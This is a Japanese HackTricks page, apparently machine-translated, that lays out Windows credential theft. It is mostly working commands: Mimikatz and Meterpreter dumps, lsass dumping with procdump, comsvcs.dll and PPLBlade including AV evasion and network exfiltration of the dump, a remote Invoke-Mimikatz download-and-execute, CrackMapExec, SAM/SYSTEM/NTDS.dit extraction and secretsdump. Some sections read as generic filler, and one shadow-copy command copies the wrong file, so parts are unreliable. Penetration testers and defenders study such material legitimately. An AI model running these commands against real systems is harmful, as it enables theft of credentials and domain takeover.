# Windowsの資格情報の盗み出し

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## Mimikatzによる資格情報の模倣
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Invoke-Mimikatzを実行する**

Invoke-Mimikatzは、Mimikatzというツールを実行するためのPowerShellスクリプトです。Mimikatzは、Windowsのセキュリティ機能をバイパスし、認証情報を盗むために使用されるツールです。

このスクリプトを実行すると、Mimikatzがメモリ内の認証情報を抽出し、平文のパスワードやハッシュを表示します。これにより、攻撃者はユーザーのパスワードを盗み、不正なアクセスを行うことができます。

Invoke-Mimikatzは、管理者権限を持つユーザーが実行する必要があります。また、Windows Defenderや他のセキュリティソフトウェアによって検出される可能性があるため、注意が必要です。

詳細な使用方法やMimikatzの他の機能については、[このページ](credentials-mimikatz.md)を参照してください。
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**ここでいくつかの可能な資格情報の保護方法について学びましょう。**](credentials-protections.md) **これらの保護方法は、Mimikatzが一部の資格情報を抽出するのを防ぐことができます。**

## Meterpreterを使用した資格情報

被害者の中にあるパスワードとハッシュを検索するために、[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **を使用してください。** これは私が作成したものです。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV回避

### Procdump + Mimikatz

**SysInternalsのProcdump**は、**Microsoftの正規ツール**であるため、Defenderに検出されません。\
このツールを使用して、**lsassプロセスをダンプ**し、**ダンプをダウンロード**して、**ダンプからローカルにクレデンシャルを抽出**することができます。

{% code title="lsassのダンプ" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% code title="ダンプから資格情報を抽出する" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

このプロセスは、[SprayKatz](https://github.com/aas-n/spraykatz)を使用して自動的に行われます：`./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**: 一部の**AV**は、**procdump.exeを使用してlsass.exeをダンプする**ことを**悪意のあるもの**として**検出**する場合があります。これは、彼らが**"procdump.exe"と"lsass.exe"**という文字列を**検出**しているためです。そのため、lsass.exeの**名前**の代わりに、procdumpにlsass.exeの**PID**を**引数**として**渡す**ことが**ステルス**になります。

### **comsvcs.dll**を使用してlsassをダンプする

`C:\Windows\System32`にある**comsvcs.dll**というDLLは、プロセスが**クラッシュ**するときに**プロセスメモリをダンプ**する役割を持っています。このDLLには、`rundll32.exe`で呼び出すことができる**`MiniDumpW`**という関数が含まれています。最初の2つの引数は使用されませんが、3番目の引数は3つの部分に分割されます。最初の部分はダンプされるプロセスのID、2番目の部分はダンプファイルの場所、3番目の部分は**full**という単語です。他の選択肢はありません。これらの3つの引数が解析されると、基本的にこのDLLはダンプファイルを作成し、指定したプロセスをそのダンプファイルにダンプします。この関数のおかげで、procdumpをアップロードして実行する代わりに、**comsvcs.dll**を使用してlsassプロセスをダンプすることができます。（この情報は[https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)から抽出されました）
```
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
この技術は**SYSTEM**としてのみ実行できることを念頭に置かなければなりません。

**[lssasy](https://github.com/Hackndo/lsassy)**を使用して、このプロセスを自動化することができます。

### タスクマネージャを使用してlsassをダンプする方法

1. タスクバーを右クリックし、タスクマネージャをクリックします。
2. 「詳細」をクリックします。
3. プロセスタブで「Local Security Authority Process」というプロセスを検索します。
4. 「Local Security Authority Process」プロセスを右クリックし、「ダンプファイルの作成」をクリックします。

### procdumpを使用してlsassをダンプする方法

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/)スイートの一部である、Microsoftによって署名されたバイナリです。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBladeを使用してlsassをダンプする

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade)は、メモリダンプを難読化し、ディスクに保存せずにリモートワークステーションに転送することができるProtected Process Dumperツールです。

**主な機能**：

1. PPL保護のバイパス
2. Defenderのシグネチャベースの検出メカニズムを回避するためのメモリダンプファイルの難読化
3. ディスクに保存せずに、RAWおよびSMBのアップロード方法でメモリダンプをアップロードする（ファイルレスダンプ）

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### SAMハッシュのダンプ
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSAシークレットのダンプ

#### 概要

LSA（Local Security Authority）シークレットは、Windowsオペレーティングシステムで使用される重要な認証情報を格納するための機能です。これには、ユーザーのパスワードやネットワーク共有の認証情報などが含まれます。このテクニックでは、LSAシークレットをダンプして、これらの機密情報を取得します。

#### 手順

1. ハッキング対象のWindowsマシンにアクセスします。

2. コマンドプロンプトまたはPowerShellを開きます。

3. `lsadump::secrets`コマンドを使用して、LSAシークレットをダンプします。

   ```
   mimikatz # lsadump::secrets
   ```

4. ダンプされた情報を確認し、必要な認証情報を取得します。

#### 注意事項

- このテクニックは、管理者権限を持つユーザーによってのみ実行できます。

- LSAシークレットのダンプは、セキュリティ上の重要な情報を取得するため、合法的な目的以外で使用することは違法です。

- このテクニックは、ペネトレーションテストやセキュリティ監査などの合法的な目的で使用されることを前提としています。
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### ターゲットDCからNTDS.ditをダンプする

```plaintext
1. ターゲットDCに対して認証情報を取得するために、有効なユーザーアカウントを使用します。
2. リモートアクセスツールを使用して、ターゲットDCに接続します。
3. NTDS.ditファイルをダンプするために、以下のコマンドを実行します。

```
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\path\to\dump" q q
```

```plaintext
4. ダンプが完了すると、NTDS.ditファイルが指定したパスに保存されます。
5. ダンプされたNTDS.ditファイルを解析して、ユーザーアカウントの認証情報を取得します。
```

注意: この手法は、合法的な目的のためにのみ使用してください。権限のないネットワークやシステムへのアクセスは違法です。
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### ターゲットDCからNTDS.ditのパスワード履歴をダンプする

```plaintext
1. ペントエスティングツールを使用して、ターゲットDCにアクセスします。
2. コマンドプロンプトまたはPowerShellを開きます。
3. `ntdsutil`と入力してEnterキーを押します。
4. `activate instance ntds`と入力してEnterキーを押します。
5. `ifm`と入力してEnterキーを押します。
6. `create full c:\path\to\output\folder`と入力してEnterキーを押します。出力フォルダのパスを指定します。
7. `quit`と入力してEnterキーを押します。
8. `quit`と再度入力してEnterキーを押します。

これにより、NTDS.ditファイルとそのパスワード履歴が指定した出力フォルダにダンプされます。
```

この手順に従うことで、ターゲットDCからNTDS.ditのパスワード履歴をダンプすることができます。
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 各NTDS.ditアカウントのpwdLastSet属性を表示する

To display the pwdLastSet attribute for each NTDS.dit account, you can use the following PowerShell command:

```powershell
Get-ADUser -Filter * -Properties pwdLastSet | Select-Object Name, pwdLastSet
```

This command will retrieve all user accounts from the NTDS.dit database and display their names along with the pwdLastSet attribute value.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAMとSYSTEMの盗み出し

これらのファイルは_C:\windows\system32\config\SAM_と_C:\windows\system32\config\SYSTEM_に**配置されています**。しかし、**通常の方法では単にコピーすることはできません**。なぜなら、これらのファイルは保護されているからです。

### レジストリから

これらのファイルを盗み出す最も簡単な方法は、レジストリからコピーすることです。
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Kaliマシン**にこれらのファイルをダウンロードし、次のコマンドを使用して**ハッシュを抽出**します。
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### ボリューム シャドウ コピー

このサービスを使用して、保護されたファイルのコピーを作成することができます。管理者である必要があります。

#### vssadmin の使用

vssadmin バイナリは、Windows Server バージョンのみで利用可能です。
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
しかし、同じことを**Powershell**からも行うことができます。以下は、**SAMファイルをコピーする方法の例**です（使用するハードドライブは「C：」で、C：\ users \ Publicに保存されます）。ただし、これは保護されたファイルをコピーするために使用することができます。
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
コードは以下の本から取得できます：[https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

最後に、[**PSスクリプトInvoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)を使用して、SAM、SYSTEM、およびntds.ditのコピーを作成することもできます。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directoryの資格情報 - NTDS.dit**

**Ntds.ditファイルは、Active Directoryのデータを格納するデータベースです**。ユーザーオブジェクト、グループ、およびグループのメンバーシップに関する情報を含みます。また、ドメイン内のすべてのユーザーのパスワードハッシュも含まれています。

重要なNTDS.ditファイルは、次の場所にあります： _%SystemRoom%/NTDS/ntds.dit_\
このファイルは、_Extensible Storage Engine_（ESE）と呼ばれるデータベースであり、公式には3つのテーブルで構成されています：

* **データテーブル**：オブジェクト（ユーザー、グループなど）に関する情報を含みます。
* **リンクテーブル**：関係（所属しているなど）に関する情報を含みます。
* **SDテーブル**：各オブジェクトのセキュリティ記述子を含みます。

詳細については、[http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)を参照してください。

Windowsは_Ntdsa.dll_を使用してそのファイルとやり取りし、_lsass.exe_によって使用されます。そのため、**NTDS.dit**ファイルの**一部**は、**`lsass`**メモリの**内部に配置**されている可能性があります（おそらくパフォーマンスの向上のために**キャッシュ**が使用されるため、最新にアクセスされたデータを見つけることができます）。

#### NTDS.dit内のハッシュの復号化

ハッシュは3回暗号化されます：

1. **BOOTKEY**と**RC4**を使用して、パスワード暗号化キー（**PEK**）を復号化します。
2. **PEK**と**RC4**を使用して、**ハッシュ**を復号化します。
3. **DES**を使用して、**ハッシュ**を復号化します。

**PEK**は、**すべてのドメインコントローラーで同じ値**を持っていますが、**NTDS.dit**ファイル内で**ドメインコントローラーのSYSTEMファイルのBOOTKEY**を使用して**暗号化**されています（ドメインコントローラー間で異なります）。これが、NTDS.ditファイルから資格情報を取得するためには、NTDS.ditファイルとSYSTEMファイル（_C:\Windows\System32\config\SYSTEM_）の両方が必要な理由です。

### Ntdsutilを使用してNTDS.ditをコピーする

Windows Server 2008以降で利用可能です。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
[**ボリュームシャドウコピー**](./#stealing-sam-and-system)トリックを使用して、**ntds.dit**ファイルをコピーすることもできます。**SYSTEMファイル**のコピーも必要です（再び、レジストリからダンプするか、[**ボリュームシャドウコピー**](./#stealing-sam-and-system)トリックを使用してください）。

### **NTDS.ditからハッシュを抽出する**

**NTDS.dit**と**SYSTEM**のファイルを**取得**したら、_secretsdump.py_などのツールを使用してハッシュを**抽出**できます。
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
有効なドメイン管理者ユーザーを使用して、それらを自動的に**抽出する**こともできます：
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**大きなNTDS.ditファイル**の場合、[gosecretsdump](https://github.com/c-sto/gosecretsdump)を使用して抽出することをおすすめします。

最後に、**メタスプロイトモジュール** `_post/windows/gather/credentials/domain_hashdump_`または**mimikatz** `lsadump::lsa /inject`を使用することもできます。

### **NTDS.ditからドメインオブジェクトをSQLiteデータベースに抽出する**

NTDSオブジェクトは、[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)を使用してSQLiteデータベースに抽出することができます。秘密情報だけでなく、生のNTDS.ditファイルが既に取得されている場合に、さらなる情報抽出のためにオブジェクト全体とその属性も抽出されます。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM`ハイブはオプションですが、シークレットの復号化（NTハッシュ、LMハッシュ、クリアテキストパスワード、Kerberosまたは信頼キー、NTハッシュ、LMハッシュのパスワード履歴などの補足資格情報）を許可します。他の情報と共に、以下のデータが抽出されます：ユーザーアカウントとマシンアカウントとそれらのハッシュ、UACフラグ、最後のログオンとパスワード変更のタイムスタンプ、アカウントの説明、名前、UPN、SPN、グループと再帰的なメンバーシップ、組織単位ツリーとメンバーシップ、信頼されたドメインとその信頼のタイプ、方向、属性...

## Lazagne

[ここ](https://github.com/AlessandroZ/LaZagne/releases)からバイナリをダウンロードします。このバイナリを使用して、さまざまなソフトウェアから資格情報を抽出できます。
```
lazagne.exe all
```
## SAMとLSASSから資格情報を抽出するための他のツール

### Windows credentials Editor (WCE)

このツールはメモリから資格情報を抽出するために使用できます。以下からダウンロードしてください：[http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAMファイルから資格情報を抽出します。
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAMファイルから資格情報を抽出します。
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

[ここからダウンロード](http://www.tarasco.org/security/pwdump\_7)し、単に**実行**するだけでパスワードが抽出されます。

## 防御策

[**ここでいくつかの資格情報の保護方法について学びましょう。**](credentials-protections.md)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
